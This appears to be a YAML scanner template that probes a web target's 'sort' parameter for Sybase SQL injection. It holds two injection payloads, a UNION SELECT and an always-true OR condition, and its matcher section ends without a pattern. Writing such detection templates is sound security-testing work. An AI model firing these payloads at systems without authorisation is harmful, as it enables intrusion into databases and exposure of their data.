id: sqli3-sybase-07
name: 'SQLi sybase prefix #6 in sort'
severity: high
type: active
tags:
  - sqli
  - injection
  - sybase
description: 'Triggers sybase error via sort'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sort:
        - ''') UNION SELECT 1,2--'
        - '''))) OR (((''1''=''1'
    matchers:
      - type: regex
